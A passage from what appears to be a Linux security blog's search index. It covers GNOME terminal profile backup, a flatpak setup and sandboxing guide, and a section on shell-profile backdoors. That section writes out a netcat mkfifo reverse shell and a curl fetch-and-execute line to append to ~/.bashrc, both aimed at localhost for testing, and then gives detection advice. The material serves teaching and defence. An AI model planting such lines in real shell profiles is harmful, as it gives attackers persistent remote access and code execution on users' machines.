'rgb(162,115,76)', 'rgb(18,72,139)', 'rgb(163,71,186)', 'rgb(42,161,179)', 'rgb(208,207,204)', 'rgb(94,92,100)', 'rgb(246,97,81)', 'rgb(51,209,122)', 'rgb(233,173,12)', 'rgb(42,123,222)', 'rgb(192,97,203)', 'rgb(51,199,222)', 'rgb(255,255,255)']\nuse-theme-colors=false\nuse-theme-transparency=false\n\n[legacy/profiles:/:2da83008-7288-437f-ab56-0e6052283371]\nbackground-color='rgb(46,52,54)'\nforeground-color='rgb(211,215,207)'\npalette=['rgb(23,20,33)', 'rgb(192,28,40)', 'rgb(38,162,105)', 'rgb(162,115,76)', 'rgb(18,72,139)', 'rgb(163,71,186)', 'rgb(42,161,179)', 'rgb(208,207,204)', 'rgb(94,92,100)', 'rgb(246,97,81)', 'rgb(51,209,122)', 'rgb(233,173,12)', 'rgb(42,123,222)', 'rgb(192,97,203)', 'rgb(51,199,222)', 'rgb(255,255,255)']\nuse-theme-colors=false\nuse-theme-transparency=false\nvisible-name='My Custom Profile'\n</code></pre> <p>This contains both the default profile, 'My Custom Profile', and includes the UUID's for both in the list variable so they'll appear in the settings UI for the GNOME terminal.</p> <p>To restore from a <code>dconf</code> backup file:</p> <pre><code># Note the path of /org/gnome/terminal/, this prepends the\n# legacy/profiles... bracketed paths in your backup.\ndconf load /org/gnome/terminal/ &lt; gnome-terminal-settings.dconf\n</code></pre> <p>If you don't see any immediate changes in your terminal window, try opening a new one.</p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#bashrc-security","title":"bashrc Security","text":"<p>As always, when researching custom <code>.bashrc</code>, <code>.zshrc</code>, or other shell configurations, be absolutely sure you've reviewed the code before dropping it into a system. These files make great targets for reverse connections and code execution, as they function like shell scripts. Anything with write access to these files can backdoor them.</p> <p>Here are two practical examples you can try using localhost (these are not meant to harm your system, but it's always recommended to do things like this in a test environment such as a VM).</p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#reverse-shell","title":"Reverse Shell","text":"<p>This uses <code>netcat</code> to simulate a reverse shell.</p> <p>On our \"server\" or the attacker's machine waiting to receive a connection: <pre><code>nc -nvlp 1234 -s 127.0.1.1\n</code></pre></p> <p>On our \"client\", this line is added to the victim machine's .bashrc file: <pre><code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -nv 127.0.1.1 1234 &gt; /tmp/f\n</code></pre></p> <p>Running <code>source ~/.bashrc</code>, you'll notice the listener on the \"attacker\" side now has a shell on your system.</p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#profile-backdoor","title":"Profile Backdoor","text":"<p>To be more realistic we'll use a python webserver to host a payload and <code>curl</code> to download it to memory and execute it.</p> <p>We'll write a payload to delete itself silently after spawning <code>gnome-calculator</code>.</p> <p>First <code>cd</code> to <code>~/Public</code> and write the following text to a file named <code>test.sh</code>:</p> <pre><code>#!/bin/bash\n\ngnome-calculator&amp;\nrm \"$0\"\n</code></pre> <p>Then start our webserver using python's built in http.server module:</p> <pre><code>python3 -m http.server 1234 --bind 127.0.1.1\n</code></pre> <p>Now on the \"victim\" side, add the following line to the bottom of your <code>~/.bashrc</code> file:</p> <pre><code>curl -s http://127.0.1.1:1234/test.sh &gt; /dev/shm/test.sh; chmod +x /dev/shm/test.sh; /dev/shm/test.sh\n</code></pre> <p>As soon as you <code>source ~/.bashrc</code> or open a new terminal tab / window, <code>gnome-calculator</code> will spawn. You'll also notice:</p> <ul> <li>No trace of <code>test.sh</code> in <code>/dev/shm/</code></li> <li>Aside from the obvious <code>gnome-calculator</code> window, the terminal window has full focus and did not print any errors or messages</li> <li><code>ps axjf</code> shows <code>gnome-calculator</code> spawned as though you ran it yourself, there's not process tree of <code>curl</code> &gt; <code>/bin/bash</code> &gt; <code>gnome-calculator</code></li> </ul>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#detecting-modification","title":"Detecting Modification","text":"<p>Hopefully this illustrates how powerful shell profiles are. It wouldn't make sense to not provide suggestions on how to detect this.</p> <p>Relevant file paths:</p> <ul> <li><code>/etc/profile</code></li> <li><code>/etc/profile.d/*</code></li> <li><code>/etc/bashrc</code></li> <li><code>/etc/bash_completion.d/*</code></li> <li><code>/etc/skel/*</code></li> <li><code>~/.bash*</code></li> <li><code>~/.profile</code></li> <li><code>~/.zshrc</code></li> <li><code>~/.zlogin</code></li> <li>and more</li> </ul> <p>String Searching</p> <p>Regularly reviewing the (writable) files for strings such as protocol connection strings like <code>://</code> or <code>\\\\\\\\</code> can point to malicious behavior, especially in files that were recently modified that shouldn't have been.</p> <p>Similarly, high-entropy or obviously encoded / obfuscated strings are indicators of suspicious activity. Conversely low-entropy lists of words or plaintext referenced or put together by functions is another techique to \"hide in plain sight\". These make it hard to see an obvious backdoor just by reading the source code, but the command will be built and executed. This will appear in logs if you're monitoring for it, assuming this technique is not also wiping logs.</p> <p>auditd</p> <p>Using <code>auditd</code> you can record and find this behavior. Like Sysmon, you'll need to configure what it records. If you're monitoring the use of <code>curl</code>:</p> <pre><code>sudo ausearch -ts recent -c curl\n</code></pre> <p>Will show every time <code>curl</code> was executed in the last 10 minutes. If you followed along with the example then in your logs you'll find:</p> <pre><code>type=EXECVE msg=audit(&lt;time&gt;:&lt;event-id&gt;): argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://127.0.1.1:1234/test.sh\"\n</code></pre> <p>Which is a pretty good indicator and starting point for further investigation.</p> <p>You can do the same with the file <code>.bashrc</code> itself:</p> <pre><code>sudo ausearch -ts recent -f bashrc\n</code></pre> <p>This will show all entries related to files named <code>bashrc</code>. Here again, following the examples you may find <code>gedit</code> or <code>vi</code> was used to edit <code>~/.bashrc</code>.</p> <p>Intrusion Detection</p> <p>Lastly, an IDS like <code>aide</code>, <code>tripwire</code>, <code>samhain</code>, or an endpoint agent like <code>wazuh</code> can be configured to monitor these directories. If changes are ever reported to your <code>~/.bashrc</code> or shell profiles, be sure to review them.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/","title":"flatpak","text":"<p>An overview of using and configuring flatpak. Flatpak is a packaging system for unix-like machines, and also a security sandboxing system.</p> <p>This file is originally from straysheep-dev/linux-configs.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#references","title":"References","text":"<p>Full documentation:</p> <ul> <li>https://docs.flatpak.org/en/latest/index.html</li> </ul> <p>Read these first before jumping in:</p> <ul> <li> <p>https://github.com/flatpak/flatpak/wiki/Sandbox</p> </li> <li> <p>https://github.com/flatpak/flatpak/wiki/Metadata</p> </li> <li> <p>https://github.com/flatpak/flatpak/wiki/Filesystem</p> </li> <li> <p>https://github.com/flatpak/flatpak/wiki/Portals</p> </li> <li> <p>https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing</p> </li> <li> <p>https://docs.flatpak.org/en/latest/conventions.html</p> </li> </ul> <p>Flatpak documentation is licensed under the <code>CC-BY 4.0</code></p> <ul> <li>https://github.com/flatpak/flatpak-docs/blob/master/COPYING</li> </ul> <p>Examples adapted from stackexchange are also under the <code>CC-BY 4.0</code></p> <ul> <li> <p>See answer from user Ian here: https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application</p> </li> <li> <p>https://stackoverflow.com/legal/terms-of-service#licensing</p> </li> <li> <p>https://creativecommons.org/licenses/by-sa/4.0/</p> </li> </ul> <p>Examples adapted from hacktricks use the <code>CC BY-NC 4.0</code> (non-commercial)</p> <ul> <li>https://github.com/carlospolop/hacktricks/blob/master/LICENSE.md</li> </ul>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#setup","title":"Setup","text":"<p>https://www.flatpak.org/setup/Ubuntu</p> <pre><code>sudo apt install flatpak\n\n# Note: the Software Center app on Ubuntu 20.04 and later is distributed as a snap package, 'snap-store'\n\n# This means following the next step and Installing gnome-software-plugin-flatpak will also install the deb\n# version of the Software Center 'gnome-software' effectively a duplicate not confined by snap.\n# The 'snap-store' does not currently support installing flatpaks via the GUI, so the CLI is used instead.\n\n# optional step:\nsudo apt install gnome-software-plugin-flatpak\n\n\nflatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo\n\n# Also not a bad idea to add the collection ID to this remote for creating offline versions of installed apps for backup:\nflatpak remote-modify --collection-id=org.flathub.Stable flathub\n\nreboot\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#filesystem-locations","title":"Filesystem Locations","text":"Location Description <code>/var/lib/flatpak/*</code> System install location for flatpak applications and runtimes <code>/var/lib/flatpak/app/</code> System-wide applications <code>/var/lib/flatpak/runtime/</code> System-wide runtimes <code>/var/lib/flatpak/sideload-repos</code> Persistent offline / local repo path (1.8.0 or later) <code>~/.var/app/*</code> User install location and cwd for flatpak configuration files <code>/run/user/$UID/doc/*</code> fusefs portal access from within the sandbox <code>/run/flatpak/sideload-repos</code> Ephemeral offline / local repo path  (1.8.0 or later) <code>/usr/share/flatpak/portals/*</code> Keys of user-granted portal permissions"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#app-runtime-filesystem-layout-on-the-host","title":"App / Runtime Filesystem Layout (on the host):","text":"<p><code>/var/lib/flatpak/(app|runtime)/ID/ARCH/BRANCH</code></p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#repositories","title":"Repositories","text":"<p>https://docs.flatpak.org/en/latest/repositories.html</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#signing-keys-flathub","title":"SIgning Keys (Flathub):","text":"<p>Keys are typically stored here:</p> <p><code>gpg /var/lib/flatpak/repo/flathub.trustedkeys.gpg</code> <pre><code>gpg: WARNING: no command supplied.  Trying to guess what you mean ...\npub   rsa4096/0x4184DD4D907A7CAE 2017-06-16 [SC] [expires: 2027-06-14]\n      Key fingerprint = 6E5C 05D9 79C7 6DAF 93C0  8135 4184 DD4D 907A 7CAE\nuid                             Flathub Repo Signing Key &lt;flathub@flathub.org&gt;\nsub   rsa4096/0x562702E9E3ED7EE8 2017-06-16 [S] [expires: 2027-06-14]\n</code></pre></p> <p>You can obtain the remote repo data for use in an offline environemnt with:</p> <p><pre><code>curl -LfO https://flathub.org/repo/flathub.flatpakrepo\n</code></pre> Extract key material for review with:</p> <pre><code>grep GPG ./org.example.app.flatpakref | cut -d '=' -f 2 | base64 -d | gpg\n</code></pre> <p>You can do the same with individual applications as well, to manually check the signatures and see what key they were signed with.</p> <p>To obtain the <code>.flatpakref</code> for an application which contains it's information and signature, follow a similar process to obtaining the signatures for setting up offline / local remotes:</p> <pre><code>curl -LfO 'https://flathub.org/repo/appstream/org.example.app.flatpakref'\n</code></pre> <p>You can then read the key data with:</p> <pre><code>grep GPG ./org.example.app.flatpakref | cut -d '=' -f 2 | base64 -d | gpg\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#verifying-a-flatpak-application","title":"Verifying a flatpak Application","text":"<p>While flatpaks exist within a security sandbox, it's still a good idea to verify you're installing the intended application from the correct developer.</p> <p>https://docs.flatpak.org/en/latest/using-flatpak.html#identifiers</p> <p>Flatpak identifies each application and runtime using a unique three-part identifier, such as <code>com.company.App</code>. The final segment of this address is the object\u2019s name, and the preceding part identifies the developer, so that the same developer can have multiple applications, like <code>com.company.App1</code> and <code>com.company.App2</code>.</p> <p>https://docs.flatpak.org/en/latest/conventions.html#application-ids</p> <p>https://github.com/flathub/flathub/wiki/App-Requirements#application-id</p> <p>As described in Using Flatpak, Flatpak requires each application to have a unique identifier, which has a form such as <code>org.gnome.Dictionary</code>.</p> <p>The format is in reverse-DNS style so the first section is generally a domain controlled by the project and the trailing section represents the specific project. There are some exceptions to this, such as extensions using the base application-id of the project they extend rather than their own.</p> <p>As will be seen below and in future sections, this ID is expected to be used in a number of places. Developers must follow the standard D-Bus naming conventions for bus names when creating their own IDs. This format is already recommended by the Desktop File specification and Appstream specification also.</p> <p>The above seems to indicate that extensions can use an existing application ID, but may not necessarily be maintained by the same developer.</p> <p>Ways you can verify you have the correct flatpak:</p> <ul> <li>Check the developer's documentation on how and where to obtain the application, it should point to an official flatpak.</li> <li>Check the flatpak id, it's often formatted as <code>tld.developer.application</code></li> <li>On the application's flathub page <code>https://flathub.org/apps/details/&lt;tld.developer.application&gt;</code> go to Publisher, then <code>See details</code>, confirm the developer is a contributer.</li> <li>Alternatively, browser to <code>https://github.com/flathub/&lt;tld.developer.application&gt;</code> and review the contributers.</li> </ul>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#general-commands","title":"General Commands","text":"<p>https://docs.flatpak.org/en/latest/using-flatpak.html</p> <pre><code># find applications\nflatpak search gimp\n\n# show info about remote applications\nflatpak remote-info flathub org.gnome.Recipes\n\n# obtain a log of all previous versions of the application\nflatpak remote-info --log flathub org.gnome.Recipes\n\n# downgrade or install a previous version\nsudo flatpak update --commit=ec07ad6c54e803d1428e5580426a41315e50a14376af033458e7a65bfb2b64f0 org.gnome.Recipes\n\n# update an application to the latest version\nsudo flatpak update org.gnome.Recipes\n\n# update all applications and runtimes\nsudo flatpak update\n\n# install an applicaiton\nflatpak install gimp\n\n# show installed flatpak data\nflatpak list\n\n# show information on an installed pacakge\nflatpak info gimp\n\n# pin a package to a version (prevent updates)\nflatpak mask org.gnome.Recipes\n\n# run an application\nflatpak run org.gimp.GIMP\n\n# inspect running apps\nflatpak ps\n\n# terminate a process\nflatpak kill &lt;application-id&gt;\n\n# show a table of all permissions granted via portals to the application(s)\nflatpak permissions\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#advanced-usage","title":"Advanced Usage","text":"<p>Configuring resource limits for apps</p> <p>https://docs.flatpak.org/en/latest/tips-and-tricks.html#configuring-resource-limits-for-apps</p> <p>When systemd is available, Flatpak tries to put app processes in a scope such</p> <p>as <code>app-com.brave.Browser-*.scope</code> (in the case of Brave), with <code>*</code> replaced by</p> <p>an arbitrary suffix. This means you can create a file like</p> <p><code>~/.config/systemd/user/app-flatpak-com.brave.Browser-.scope.d/memory.conf</code></p> <p>with contents like::</p> <pre><code>  [Scope]\n  MemoryHigh=1G\n</code></pre> <p>Then after a <code>systemctl --user daemon-reload</code>, those</p> <p><code>systemd.resource-control(5)</code> parameters will apply to all instances of that</p> <p>app.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#creating-applications-to-go","title":"Creating Applications To-Go","text":"<p>Create offline / local copies of applications as backups or specific versions or to install on offline machines.</p> <p>Summary</p> <ol> <li> <p><code>flatpak install flathub org.example.app</code></p> </li> <li> <p><code>flatpak create-usb . org.example.app</code> NOTE: you may also need to do this for all required runtimes</p> <p>3.1 place the <code>.ostree</code> directory into a mounted folder and run <code>flatpak install flathub org.example.app</code> or 3.2 run <code>flatpak install --sideload-repo=/path/to/.ostree/repo flathub org.example.app</code></p> </li> <li> <p>https://docs.flatpak.org/en/latest/usb-drives.html</p> </li> <li> <p>https://blogs.gnome.org/mclasen/2018/08/26/about-flatpak-installations/</p> </li> <li> <p>https://github.com/flatpak/flatpak-docs/commit/5febc66828e485a3632e97b78030aad433544896</p> </li> <li> <p>https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak</p> </li> <li> <p>https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak-create-usb</p> </li> <li> <p>https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application</p> </li> </ol> <p>If you're familiar with <code>snap</code> packages, this effectively gives you the <code>.snap</code> and <code>.assert</code> equivalent, the app, runtimes, and valid gpg signatures. With flatpak, it's in the form of a local repository, meaning a directory of the application with all of the necessary data to install it offline.</p> <p>To create, or essentially download a flatpak application either to have as an offline backup, a specific version, or to transfer to an airgapped machine, there are two ways to do this which depend on which <code>flatpak --version</code> you're running.</p> <p>This is ideal for running tests on various versions of an application without burning a large amount of data uninstalling then redownloading, both for yourself and for the flatpak remote server you're pulling from.</p> <p>This example uses the following:</p> <ul> <li>flathub as the remote repo.</li> <li>org.gnome.Recipes as the application</li> </ul> <p>First install the target application (you need to install it to create the offline / local version), then gather and configure, the following information:</p> <pre><code># obtain the full application id, which is in the next step is 'org.gnome.Recipes'\nflatpak list --app\n# obtain the name of the remote repo\nflatpak info -o org.gnome.Recipes\n# using the name obtained in the previous step, check the Collection ID field of the remote repo:\nflatpak remotes -d\n\n# typically if you did not configure this already, even for flathub it will be blank.\n# this step is required for the correct metadata to be in the application when making the offline / local version\n# so that signature verification can still take place.\n# we can add this manually using the following:\nflatpak remote-modify --collection-id=org.flathub.Stable flathub\n</code></pre> <p>Next, get a copy of the remote repo's metadata and gpg signature.</p> <p>You'll want to do this if you are moving the application to an offline environment that doesn't already have the remote repo configured. Using the <code>flathub.flatpakrepo</code> file you can replicate the initial setup steps entirely offline.</p> <pre><code>curl -LfO https://flathub.org/repo/flathub.flatpakrepo\n</code></pre> <p>Now create the offline / local copy of the application.</p> <p>This is simply a directory of the applicaiton data which can be moved around and installed from elsewhere. We'll create it in the current working directory for now.</p> <p><pre><code>flatpak create-usb . org.gnome.Recipes\n# you'll see output explaining what's being written, and how much is left to write\n\n# check for the .ostree directory\nls -la\n\ntotal 12\ndrwxrwxr-x 3 user user 4096 Apr 20 18:58 .\ndrwxrwxr-x 3 user user 4096 Apr 20 18:58 ..\ndrwxr-xr-x 3 user user 4096 Apr 20 18:58 .ostree\n</code></pre> TIP: Additionally, you can use <code>create-usb</code> in this exact same directory just like before, to add other applications to this <code>.ostree</code> repo.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#installing-the-local-offline-application","title":"Installing the Local / Offline Application","text":"<p>If the environment is completely offline and does not have the inital setup of remotes, be sure to use the <code>flathub.flatpak</code> file:</p> <pre><code># must be done from a local repo search path, such as a mounted device prior to flatpak 1.8.0; we'll create one\nsudo mkdir /media/$USERNAME/local\nsudo mount --bind /media/$USERNAME/local /media/$USERNAME/local\nsudo cp ./flathub.flatpakrepo /media/$USERNAME/local\ncd /media/$USERNAME/local\n\nsudo flatpak remote-add --if-not-exists flathub ./flathub.flatpakrepo\nsudo flatpak remote-modify --collection-id=org.flathub.Stable flathub\n\nsudo umount /media/$USERNAME/local\nsudo rm -rf /media/$USERNAME/local\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#flatpak-180-or-later","title":"Flatpak 1.8.0 or later","text":"<p>Flatpak searches these two directories...</p> <ul> <li><code>/run/flatpak/sideload-repos</code></li> <li><code>/var/lib/flatpak/sideload-repos</code></li> </ul> <p>...as local repos, looking for the <code>.ostree/repo</code> subdirectories within them.</p> <p>These locations can contain symlinks to the offline application's diectory.</p> <p>To create a temprorary local repo, use the /run location here:</p> <pre><code># using /run/flatpak/sideload-repos:\nsudo mkdir -p /run/flatpak/sideload-repos\nsudo chmod 755 /run/flatpak/sideload-repos\nsudo ln -s /path/to/&lt;local-repo&gt; /run/flatpak/sideload-repos/&lt;local-repo&gt;\n\n# where /path/to/&lt;local-repo&gt; could look like: /media/user/flatpaklocal\n# making the symlink: /run/flatpak/sideload-repos/flatpaklocal\n</code></pre> <p>If you want this to be persistent, use the /var location here:</p> <pre><code># using /var/lib/flatpak/sideload-repos:\nsudo mkdir /var/lib/flatpak/sideload-repos\nsudo chmod 755 /var/lib/flatpak/sideload-repos\nsudo ln -s /path/to/&lt;local-repo&gt; /var/lib/flatpak/sideload-repos/&lt;local-repo&gt;\n\n# where /path/to/local/&lt;repo&gt; could look like: /media/user/flatpaklocal\n# making the symlink: /var/lib/flatpak/sideload-repos/flatpaklocal\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#flatpak-prior-to-180","title":"Flatpak prior to 1.8.0","text":"<p>This didn't make sense until adding the <code>--ostree-verbose</code> argument to the install command (at the time of writing Flatpak 1.6.5).</p> <pre><code>flatpak install --ostree-verbose flathub org.gnome.Recipes\n\n# reading the output showed the following line:\nF: ostree_repo_finder_mount_resolve_async: Found 2 mounts\n</code></pre> <p>After mounting the directory made for the local repo as a bind mount, flatpak immediately picked up the application.</p> <pre><code>sudo mkdir /media/$USERNAME/flatpaklocal\nsudo mv .ostree -t /media/$USERNAME/flatpaklocal\nsudo mount --bind /media/$USERNAME/flatpaklocal /media/$USERNAME/flatpaklocal\n# now the filesystem sees the local repo directory as a mounted device\n</code></pre> <p>Lastly, install your application(s) as normal:</p> <pre><code>flatpak install flathub org.gnome.Recipes\n</code></pre> <p>Again, running <code>--ostree-verbose</code> with the install command will show the local repo is found, and signatures are verified.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#explore-an-application-sandbox","title":"Explore an Application Sandbox","text":"<p>Run another command within the security context of the application</p> <ul> <li> <p>https://github.com/flatpak/flatpak/wiki/Sandbox#the-current-flatpak-sandbox</p> </li> <li> <p>https://docs.flatpak.org/en/latest/debugging.html#running-debugging-tools</p> </li> </ul> <pre><code># extremely useful for debugging and validating permission overrides\nflatpak run --command=bash org.gimp.GIMP\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#file-chooser-portal-database","title":"File-Chooser Portal / Database","text":"<p>https://github.com/flatpak/flatpak/wiki/Portals#the-filechooser-portal</p> <p>The following commands will show you all permissions granted by the user, from GUI interaction with the portal mechanism (dialogues).</p> <ul> <li>https://docs.flatpak.org/en/latest/debugging.html#inspecting-portal-permissions</li> </ul> <p>This is described here: https://flatpak.github.io/xdg-desktop-portal/#gdbus-org.freedesktop.portal.FileChooser</p> <pre><code># show permissions per app, or for all apps\nflatpak permissions\nflatpak permission-list\nflatpak permission-show org.gimp.GIMP\n\n# example output, testing portal permissions:\nTable      Object     App                    Permissions                  Data\ndocuments  546354f8   com.giuspen.cherrytree read,write,grant-permissions (b'/etc/passwd', 2050, 131073, 0)\ndocuments  d82b71a9   com.giuspen.cherrytree read,write,grant-permissions (b'/home/user/.ssh/id_rsa', 2050, 2490370, 0)\ndocuments  6c55c619   com.giuspen.cherrytree read,write,grant-permissions (b'/boot/test.ctz.pdf', 2050, 262145, 0)\ndocuments  d5917d15   com.giuspen.cherrytree read,write,grant-permissions (b'/etc/test.pdf', 2050, 131073, 0)\ndocuments  514101fb   com.giuspen.cherrytree read,write,grant-permissions (b'/home/user/Documents/test', 2050, 262930, 0)\ndocuments  df008b13   com.giuspen.cherrytree read,write,grant-permissions (b'/home/user/.gnupg/gpg.conf', 2050, 2493681, 0)\n\n# running reset will take away those permissions until you manually 'grant' them again by manually selecting or opening those files via a dialogue.\n# this means until you revoke permission, you can access all of these files via a shell from within the application sandbox\nflatpak permission-reset com.giuspen.cherrytree\n\nTable      Object     App                    Permissions                  Data\ndocuments  546354f8                                                       (b'/etc/passwd', 2050, 131073, 0)\ndocuments  d82b71a9                                                       (b'/home/user/.ssh/id_rsa', 2050, 2490370, 0)\ndocuments  6c55c619                                                       (b'/boot/test.ctz.pdf', 2050, 262145, 0)\ndocuments  d5917d15                                                       (b'/etc/test.pdf', 2050, 131073, 0)\ndocuments  514101fb                                                       (b'/home/user/Documents/test', 2050, 262930, 0)\ndocuments  df008b13                                                       (b'/home/user/.gnupg/gpg.conf', 2050, 2493681, 0)\n</code></pre> <p>The above example was done with strict global overrides. This table shows every time a permission was manually granted by the user via a 'save as' style window when importing and exporting data with CherryTree.</p> <p>To see where copies of host files are made available to the sandbox, run <code>ls -l /run/user/1000/doc</code> to find folders relating to each object ID. This is the file-chooser portal's database, tracking all files accessed by sandboxed apps.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#sandbox-overview","title":"Sandbox Overview","text":"<p>https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes</p> <p>Both the application and it's runtimes operate within the defined sandbox.</p> <p>Runtimes adhere to the permissions granted to the application itself.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#sandbox-permissions","title":"Sandbox Permissions","text":"<p>See this page for an overview of permissions:</p> <p>https://docs.flatpak.org/en/latest/sandbox-permissions.html</p> <p>And this page for a complete reference:</p> <p>https://docs.flatpak.org/en/latest/sandbox-permissions-reference.html</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#d-bus-access","title":"D-Bus Access","text":"<p>&lt;https://docs.flatpak.org/en/latest/sandbox-permissions.html#d-bus-access</p> <p>Applications exist in their own namespace, and typically do not need access beyond that.</p> <p>Media controls, for example, would be an exception (see the above link for details).</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#monitoring-d-bus","title":"Monitoring D-Bus","text":"<p>https://wiki.ubuntu.com/DebuggingDBus</p> <p>https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.md</p> <pre><code>sudo apt install -y d-feet gdbus\n\n# monitor dbus session\ndbus-monitor\n\n# monitor system dbus session\n# see https://wiki.ubuntu.com/DebuggingDBus for configuration changes\nsudo dbus-monitor --system\n\n# or\nsudo busctl monitor\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#portals","title":"Portals","text":"<p>https://docs.flatpak.org/en/latest/sandbox-permissions.html#portals</p> <p>https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing</p> <p>Complete API reference:</p> <ul> <li>https://flatpak.github.io/xdg-desktop-portal/</li> </ul> <p>Portals handle the following actions, and require user interaction for the action to take place:</p> <ul> <li>Opening files with a native file chooser dialog</li> <li>Opening URIs</li> <li>Printing</li> <li>Showing notifications</li> <li>Taking screenshots</li> <li>Inhibiting the user session from ending, suspending, idling or getting switched away</li> <li>Getting network status information</li> </ul> <p>GTK3 and Qt5 have support for portals built-in, while applications not using either can refer to this documentation:</p> <ul> <li>https://flatpak.github.io/xdg-desktop-portal/portal-docs.html</li> </ul> <p>From the portal docs:</p> <pre><code>The FileChooser portal allows sandboxed applications to ask the user for access to files outside the sandbox.\nThe portal backend will present the user with a file chooser dialog.\n\nThe selected files will be made accessible to the application via the document portal,\nand the returned URI will point into the document portal fuse filesystem in /run/user/$UID/doc/.\n\nThis documentation describes version 3 of this interface.\n</code></pre> <p>If you run <code>ls -l /run/user/1000/doc</code> you'll find the fusefs entries for each object ID in <code>flatpak permission-show</code>. This is where permitted files are copied so that the sandbox may access them while still keeping the host [files] shielded.</p> <p>When reviewing and validating the boundaries of the security sandbox, one thing that can be confusing is when a portal transparently opens nautilus (or your system's file viewer) in an unrestricted context, when other times it may not be using a portal, and will adhere to the permissions / overrides you'd expect.</p> <p>We'll use nautilus as an example, it is a common filesystem browser utility (like windows explorer). The process can be spawned simply by opening your folder application.</p> <p>What to look for is when a portal is used, you will be able to traverse your entire filesystem as nautilus may not be sandboxed in the same way your flatpak app is.</p> <p>The CherryTree (flatpak) has a few options under File &gt; Export:</p> <ul> <li>Export to plain text<ul> <li>Select any additional options from here, but notice you're confined to browsing only within the defined filesystem sandbox boundaries in this prompt</li> </ul> </li> <li>Export to [option]<ul> <li>Any of the other options here allow you to fully traverse the filesystem outside of the sandbox since this is a portal, a separate process.</li> <li>Choose to save a document outside of the sandbox</li> <li>Running <code>flatpak permission-show com.giuspen.cherrytree</code> will show every location accessed outside of the sandbox via portals.</li> </ul> </li> </ul>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#user-defined-permissions-flatpak-override","title":"User Defined Permissions (flatpak override)","text":"<p>Modify the application's sandbox and permissions.</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#global-overrides","title":"Global Overrides","text":"<p>Users can define a global override policy, for example:</p> <p><pre><code>sudo flatpak override --nofilesystem=host\n\nflatpak override --show\n\n[Context]\nfilesystems=!host;\n</code></pre> This will prevent all flatpak applications from accessing the host filesystem unrestricted.</p> <p>This can be ideal, as many applications come with unrestricted 'host' enabled by default ('host' meaning all non-system files are accessible to the app).</p> <p>The following is one approach, using a global 'deny all', then allowing only what's necessary in an application's specific overrides:</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#system-wide-overrides","title":"System-Wide Overrides:","text":"<p><code>/var/lib/flatpak/overrides/global</code></p> <pre><code>[Context]\nfilesystems=!host;\nshared=!network;!ipc;\n\n[Session Bus Policy]\norg.gtk.vfs.*=none\norg.gtk.vfs=none\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#a-note-on-gvfs","title":"A Note On gvfs","text":"<p>According to this, applications should not be using <code>org.gtk.vfs</code> in their permissions.</p> <p>https://docs.flatpak.org/en/latest/sandbox-permissions.html#gvfs-access</p> <pre><code>sudo flatpak override --no-talk-name=\"org.gtk.vfs\"\nsudo flatpak override --no-talk-name=\"org.gtk.vfs.*\"\n</code></pre>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#application-level-overrides","title":"Application Level Overrides:","text":"<p><code>/var/lib/flatpak/overrides/org.gimp.GIMP</code></p> <pre><code>[Context]\nfilesystems=~/snap/flatpakaccess/gimp:create;\n\n[Session Bus Policy]\norg.freedesktop.FileManager1=none\n</code></pre> <p>https://github.com/flatpak/flatpak/issues/4643</p>"},{"location":"blog/2024/05/07/simple-flatpak-flatpak/#runtimes-and-sandboxing","title":"Runtimes and Sandboxing","text":"<ul> <li> <p>https://github.com/flatpak/flatpak/wiki/Metadata#runtime-metadata</p> </li> <li> <p>https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes</p> </li> </ul> <p>Each sandbox contains an application and its runtime.</p> <p>Same as for applications it is possible to override environment variables for entire runtimes. The overrides for runtime environment variables are applied before application overrides, so if both runtime and application override the same environment variable, the value within the application metadata file wins.</p> <p>Global overrides cover both, applications and their runtimes.</p> <p>To view an applications default permissions, find the <code>metadata</code> file:</p> <pre><code>find /var/lib/flatpak/ -name \"metadata\" -ls\n\ncat 